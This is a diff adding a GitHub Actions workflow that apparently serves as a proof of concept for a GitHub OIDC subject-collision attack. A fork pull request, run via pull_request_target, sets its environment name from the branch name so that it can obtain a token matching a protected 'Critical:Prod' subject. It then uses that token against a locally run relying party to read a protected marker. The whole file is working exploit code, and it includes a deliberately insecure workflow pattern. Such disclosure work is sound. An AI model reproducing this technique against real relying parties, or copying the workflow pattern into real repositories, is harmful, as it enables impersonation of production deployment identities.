@@ -1,0 +1,186 @@
+name: Fork PR OIDC relying-party impact proof
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  rp-impact:
+    if: github.event.pull_request.head.repo.fork == true
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    environment:
+      name: ${{ github.head_ref }}
+    steps:
+      - name: Start isolated owned exact-sub relying party
+        shell: bash
+        run: |
+          set -euo pipefail
+          node <<'NODE' >/tmp/owned-oidc-rp.log 2>&1 &
+          const crypto = require('crypto');
+          const http = require('http');
+          const https = require('https');
+
+          const expectedIssuer = 'https://token.actions.githubusercontent.com';
+          const expectedAudience = 'urn:owned:oidc-rp-impact';
+          const expectedProtectedSubject =
+            'repo:Per0x1de-1337@162025236/codex-oidc-injectivity-20261106154500@1448444049:environment:Critical%3AProd';
+          const protectedMarker = `owned-prod-marker-${crypto.randomBytes(24).toString('hex')}`;
+          const markerSha256 = crypto.createHash('sha256').update(protectedMarker).digest('hex');
+          const sessions = new Set();
+
+          function getJson(url) {
+            return new Promise((resolve, reject) => {
+              const request = https.get(url, (response) => {
+                let body = '';
+                response.setEncoding('utf8');
+                response.on('data', (chunk) => { body += chunk; });
+                response.on('end', () => {
+                  if (response.statusCode < 200 || response.statusCode >= 300) {
+                    reject(new Error(`HTTP ${response.statusCode}`));
+                    return;
+                  }
+                  try {
+                    resolve(JSON.parse(body));
+                  } catch (error) {
+                    reject(error);
+                  }
+                });
+              });
+              request.on('error', reject);
+            });
+          }
+
+          async function verifyOidc(jwt) {
+            const parts = jwt.split('.');
+            if (parts.length !== 3) throw new Error('unexpected JWT structure');
+            const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
+            const claims = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
+            if (header.alg !== 'RS256') throw new Error('unexpected signing algorithm');
+
+            const discovery = await getJson(`${expectedIssuer}/.well-known/openid-configuration`);
+            const jwks = await getJson(discovery.jwks_uri);
+            const jwk = jwks.keys.find((candidate) => candidate.kid === header.kid);
+            if (!jwk) throw new Error('GitHub signing key not found');
+
+            const publicKey = crypto.createPublicKey({ key: jwk, format: 'jwk' });
+            const signatureValid = crypto.verify(
+              'RSA-SHA256',
+              Buffer.from(`${parts[0]}.${parts[1]}`),
+              publicKey,
+              Buffer.from(parts[2], 'base64url'),
+            );
+            const now = Math.floor(Date.now() / 1000);
+            if (!signatureValid) throw new Error('invalid signature');
+            if (claims.iss !== expectedIssuer) throw new Error('issuer mismatch');
+            if (claims.aud !== expectedAudience) throw new Error('audience mismatch');
+            if (claims.sub !== expectedProtectedSubject) throw new Error('subject mismatch');
+            if (claims.nbf > now || claims.exp <= now) throw new Error('token is not current');
+            return claims;
+          }
+
+          function send(response, status, body) {
+            const encoded = JSON.stringify(body);
+            response.writeHead(status, {
+              'Content-Type': 'application/json',
+              'Content-Length': Buffer.byteLength(encoded),
+            });
+            response.end(encoded);
+          }
+
+          const server = http.createServer(async (request, response) => {
+            try {
+              if (request.method === 'GET' && request.url === '/health') {
+                send(response, 200, { ready: true, marker_sha256: markerSha256 });
+                return;
+              }
+              if (request.method === 'POST' && request.url === '/exchange') {
+                const auth = request.headers.authorization || '';
+                if (!auth.startsWith('Bearer ')) throw new Error('OIDC bearer missing');
+                const claims = await verifyOidc(auth.slice('Bearer '.length));
+                const accessToken = crypto.randomBytes(32).toString('hex');
+                sessions.add(accessToken);
+                send(response, 200, {
+                  access_token: accessToken,
+                  authenticated_sub: claims.sub,
+                  actual_environment: claims.environment,
+                  actor_id: claims.actor_id,
+                });
+                return;
+              }
+              if (request.method === 'GET' && request.url === '/protected-marker') {
+                const auth = request.headers.authorization || '';
+                const accessToken = auth.startsWith('Bearer ') ? auth.slice('Bearer '.length) : '';
+                if (!sessions.delete(accessToken)) {
+                  send(response, 403, { error: 'valid RP session required' });
+                  return;
+                }
+                send(response, 200, {
+                  protected_marker: protectedMarker,
+                  marker_sha256: markerSha256,
+                  production_read_authorized: true,
+                });
+                return;
+              }
+              send(response, 404, { error: 'not found' });
+            } catch (error) {
+              send(response, 403, { error: error.message });
+            }
+          });
+
+          server.listen(43117, '127.0.0.1');
+          setTimeout(() => server.close(), 120000).unref();
+          NODE
+
+          for attempt in 1 2 3 4 5 6 7 8 9 10; do
+            if curl --fail --silent http://127.0.0.1:43117/health >/dev/null; then
+              exit 0
+            fi
+            sleep 1
+          done
+          printf 'Owned relying party did not start\n' >&2
+          exit 1
+
+      - name: Exchange colliding OIDC identity and read protected marker
+        shell: bash
+        run: |
+          set -euo pipefail
+          oidc_response="$({
+            curl --fail-with-body --silent --show-error \
+              -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=urn%3Aowned%3Aoidc-rp-impact"
+          })"
+          oidc_token="$(jq -er '.value' <<<"$oidc_response")"
+
+          exchange_response="$({
+            curl --fail-with-body --silent --show-error \
+              -X POST \
+              -H "Authorization: Bearer ${oidc_token}" \
+              http://127.0.0.1:43117/exchange
+          })"
+          access_token="$(jq -er '.access_token' <<<"$exchange_response")"
+          protected_response="$({
+            curl --fail-with-body --silent --show-error \
+              -H "Authorization: Bearer ${access_token}" \
+              http://127.0.0.1:43117/protected-marker
+          })"
+
+          result="$({
+            jq -cn \
+              --argjson exchange "$exchange_response" \
+              --argjson protected "$protected_response" \
+              '{
+                rp_exchange_succeeded:true,
+                authenticated_sub:$exchange.authenticated_sub,
+                actual_environment:$exchange.actual_environment,
+                actor_id:$exchange.actor_id,
+                production_read_authorized:$protected.production_read_authorized,
+                protected_marker:$protected.protected_marker,
+                marker_sha256:$protected.marker_sha256
+              }'
+          })"
+          printf 'OIDC_RP_IMPACT=%s\n' "$result"
